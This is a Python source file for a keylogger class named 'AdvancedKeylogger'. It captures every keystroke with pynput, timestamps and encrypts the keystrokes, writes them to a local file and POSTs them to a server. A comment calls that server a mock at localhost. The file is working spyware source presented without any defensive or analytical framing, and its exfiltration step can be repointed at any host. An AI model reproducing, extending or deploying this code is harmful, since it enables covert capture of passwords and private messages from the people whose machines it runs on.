from pynput import keyboard
from datetime import datetime
import requests
from crypto_utils import Encryptor

class AdvancedKeylogger:
    def __init__(self):
        self.log_file = "keylog.encrypted"
        self.kill_switch = False
        self.encryptor = Encryptor()
        self.buffer = []
        self.buffer_size = 10
        
    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            keystroke = f"{timestamp} - {key.char if hasattr(key, 'char') else key}"
            self.buffer.append(keystroke)
            
            if len(self.buffer) >= self.buffer_size:
                self._process_buffer()
            
            if key == keyboard.Key.f12:
                self.kill_switch = True
                return False
                
        except Exception as e:
            print(f"Error: {e}")
    
    def _process_buffer(self):
        if self.buffer:
            data = "\n".join(self.buffer)
            encrypted_data = self.encryptor.encrypt_data(data)
            
            # Save locally
            with open(self.log_file, "ab") as f:
                f.write(encrypted_data + b"\n")
            
            # Send to mock server
            try:
                requests.post(
                    "http://localhost:8080",
                    data=encrypted_data,
                    timeout=1
                )
            except requests.exceptions.RequestException:
                pass
            
            self.buffer.clear()
    
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = AdvancedKeylogger()
    keylogger.start()